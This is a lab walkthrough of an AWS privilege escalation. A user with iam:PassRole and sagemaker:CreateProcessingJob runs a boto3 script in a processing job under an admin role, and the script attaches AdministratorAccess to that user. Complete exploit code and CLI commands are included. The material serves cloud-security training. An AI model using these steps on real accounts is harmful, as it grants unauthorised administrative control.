# Guided Walkthrough: Privilege Escalation via iam:PassRole + sagemaker:CreateProcessingJob

This scenario demonstrates a critical privilege escalation vulnerability where a user with `iam:PassRole` and `sagemaker:CreateProcessingJob` permissions can execute arbitrary code with administrative privileges. Amazon SageMaker Processing Jobs are designed for data processing and ML feature engineering tasks, but they can be exploited to run malicious code when combined with an overly permissive execution role.

The attack works by uploading a malicious processing script to S3, then creating a SageMaker processing job that executes this script with an admin-level IAM role. The processing job runs in a container environment with the passed role's permissions, allowing the attacker to execute any AWS API calls with administrative access. This could include creating new access keys for the original user, modifying IAM policies, accessing sensitive data, or pivoting to other resources.

This technique was discovered by Spencer Gietzen of Rhino Security Labs in 2019 and represents a common pattern in cloud privilege escalation: exploiting AWS service trust relationships to execute code with elevated permissions. Unlike direct IAM permission modification, this attack leverages a legitimate AWS service (SageMaker) as an execution platform, making it potentially harder to detect. The attack is particularly dangerous because SageMaker processing jobs have broad network access and can run arbitrary code in Python, making them ideal vehicles for post-exploitation activities.

## The Challenge

You start with credentials for `pl-prod-sagemaker-003-to-admin-starting-user`. This user has a limited, targeted permission set: `iam:PassRole` scoped to `pl-prod-sagemaker-003-to-admin-passable-role`, `sagemaker:CreateProcessingJob`, and `s3:PutObject`/`s3:GetObject` on the scenario's S3 staging bucket. At the start, this user cannot list IAM users, list policies, or call any admin-level APIs.

Your goal is to reach effective administrator access — specifically by causing `AdministratorAccess` to be attached to the starting user. The path runs through SageMaker: you'll use the legitimate processing job infrastructure as an execution platform, running your own Python code under the admin role's identity.

## Reconnaissance

First, let's confirm who you are and verify that you don't yet have admin access:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-sagemaker-003-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- good, we don't have admin yet
```

If you have helpful permissions, you can enumerate the passable role to confirm it has `AdministratorAccess` and trusts `sagemaker.amazonaws.com`:

```bash
aws iam get-role --role-name pl-prod-sagemaker-003-to-admin-passable-role \
  --query 'Role.AssumeRolePolicyDocument'
# Trust policy will show sagemaker.amazonaws.com as a trusted service

aws iam list-attached-role-policies \
  --role-name pl-prod-sagemaker-003-to-admin-passable-role
# AdministratorAccess will be listed
```

The key insight here is that this role trusts `sagemaker.amazonaws.com` -- meaning SageMaker can assume it on your behalf when you create a processing job. Anything you put in the processing script will execute with the full permissions of that admin role.

## Exploitation

### Step 1: Create the malicious processing script

The script is straightforward -- it uses `boto3` to attach `AdministratorAccess` to the starting user. Because the processing job runs with the admin role's credentials (available automatically via IMDS inside the container), this IAM call succeeds:

```python
#!/usr/bin/env python3
import boto3
import sys

def main():
    try:
        iam = boto3.client('iam')
        starting_user = 'pl-prod-sagemaker-003-to-admin-starting-user'

        print(f"[+] Attempting to attach AdministratorAccess to {starting_user}")
        iam.attach_user_policy(
            UserName=starting_user,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        print(f"[+] Successfully attached AdministratorAccess to {starting_user}")
        print("[+] Privilege escalation successful!")

        response = iam.list_attached_user_policies(UserName=starting_user)
        print(f"[+] Attached policies: {response['AttachedPolicies']}")
        return 0
    except Exception as e:
        print(f"[-] Error: {str(e)}", file=sys.stderr)
        return 1

if __name__ == "__main__":
    sys.exit(main())
```

Save this as `/tmp/exploit.py`.

### Step 2: Upload the script to S3

The starting user has `s3:PutObject` on the scenario's staging bucket. Upload the script there so the processing job can pull it down:

```bash
aws s3 cp /tmp/exploit.py \
  s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/scripts/exploit.py
```

### Step 3: Create the SageMaker processing job

Now create the processing job, passing the admin role as the execution role. Choose a region-appropriate scikit-learn container image (the demo script includes a lookup table for common regions; `us-east-1` uses `683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3`):

```bash
aws sagemaker create-processing-job \
  --region {region} \
  --processing-job-name pl-sagemaker-003-exploit-job \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-sagemaker-003-to-admin-passable-role \
  --processing-inputs '[{
    "InputName":"code",
    "S3Input":{
      "S3Uri":"s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/scripts/",
      "LocalPath":"/opt/ml/processing/input/code",
      "S3DataType":"S3Prefix",
      "S3InputMode":"File"
    }
  }]' \
  --processing-output-config '{"Outputs":[{
    "OutputName":"output",
    "S3Output":{
      "S3Uri":"s3://pl-prod-sagemaker-003-to-admin-bucket-{account_id}-{suffix}/output/",
      "LocalPath":"/opt/ml/processing/output",
      "S3UploadMode":"EndOfJob"
    }
  }]}' \
  --processing-resources '{"ClusterConfig":{
    "InstanceCount":1,
    "InstanceType":"ml.t3.medium",
    "VolumeSizeInGB":10
  }}' \
  --app-specification '{
    "ImageUri":"683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3",
    "ContainerEntrypoint":["python3"],
    "ContainerArguments":["/opt/ml/processing/input/code/exploit.py"]
  }'
```

The key parameters here are `--role-arn` (this is the `iam:PassRole` action in practice -- you're telling SageMaker to assume this role for the job) and `ContainerArguments` (pointing to your uploaded script).

### Step 4: Wait for the job to complete

SageMaker processing jobs take 3-5 minutes to spin up the container and execute. Poll the job status:

```bash
aws sagemaker describe-processing-job \
  --region {region} \
  --processing-job-name pl-sagemaker-003-exploit-job \
  --query 'ProcessingJobStatus' \
  --output text
# InProgress ... InProgress ... Completed
```

Wait until the status is `Completed`. If it shows `Failed`, check the `FailureReason` field for details.

## Verification

Once the job completes, wait 15 seconds for IAM propagation, then verify:

```bash
aws iam list-attached-user-policies \
  --user-name pl-prod-sagemaker-003-to-admin-starting-user \
  --query 'AttachedPolicies[*].PolicyArn' \
  --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3 --output table
# Successfully returns users -- admin access confirmed
```

## What Happened

You exploited the combination of `iam:PassRole` and `sagemaker:CreateProcessingJob` to launder code execution through a legitimate AWS service. The critical vulnerability is that the `pl-prod-sagemaker-003-to-admin-passable-role` role trusts `sagemaker.amazonaws.com` and carries `AdministratorAccess` -- a misconfiguration that makes it passable to any processing job. Because the execution role's credentials are automatically injected into the container via IMDS, your Python script could make IAM API calls as if it were the admin role itself.

This pattern appears in real environments whenever ML teams create broadly-trusted SageMaker execution roles for convenience. The role is often created with `AdministratorAccess` to avoid permission troubleshooting, then forgotten. Any user who can discover the role and holds `iam:PassRole` plus any SageMaker job-creation permission gains a full escalation path to admin.
